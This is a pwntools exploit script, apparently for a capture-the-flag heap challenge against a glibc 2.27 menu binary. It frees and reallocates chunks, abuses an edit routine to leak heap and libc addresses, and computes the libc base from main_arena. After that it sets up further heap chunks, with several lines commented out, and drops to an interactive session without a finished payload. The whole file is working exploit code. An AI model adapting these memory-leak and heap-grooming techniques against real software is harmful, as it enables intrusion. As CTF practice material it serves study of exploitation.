#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["alacritty","-e"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
s = lambda p,a: p.send(a)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"exit\n")
    sl(p,b"1")
    ru(p,b"size?")
    sl(p,b"%i" % size)
    ru(p,b"str?")
    s(p,value)

def edit(p, index, value):
    ru(p,b"exit\n")
    sl(p,b"2")
    ru(p,b"idx?")
    sl(p,b"%i" % index)
    ru(p,b"delim?")
    s(p,value)

    value = b"\xa0" + rl(p).strip()

    log.info(f"Leak {value}")
    return value
    

def delete(p, index):
    ru(p,b"exit\n")
    sl(p,b"3")
    ru(p,b"idx?")
    sl(p,b"%i" % index)


def exploit(p,e,l):


    for i in range(3):
        create(p,0x518,b"A" * 0x518)
        create(p,0x18,b"GUARD")
        

    for i in range(3):
        delete(p,i)
    
    
    create(p,0x518,b"A"*8)
    create(p,0x518,b"A"*8)

    heap_leak = edit(p,0, b"\xff")
    heap_leak = heap_leak[9:]
    heap_leak = u64(heap_leak.ljust(8,b"\x00"))
    log.info(f"Found heap leak {hex(heap_leak)}")

    libc_leak = edit(p,1,b"\xff")
    libc_leak = libc_leak[9:]
    libc_leak = u64(libc_leak.ljust(8,b"\x00"))
    libc_base = libc_leak - (l.sym["main_arena"] + 96)

    log.info(f"Found libc leak {hex(libc_leak)}")
    log.info(f"Resolved libc base {hex(libc_base)}")


    for i in range(7):
        delete(p,i)

    pause()

    create(p, 0xf8, b"A" * 0xf8)
    create(p, 0xf8, b"B")
    create(p, 0xf8, b"C")
    #create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
    #create(p, 0x88, b"C" * 0x88)

    #delete(p, 2)
    #edit(p, 1, b"\x11")


    #create(p, 0x288, b"1" * 0x278)

    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc-2.27.so")

    exploit(p,e,l)
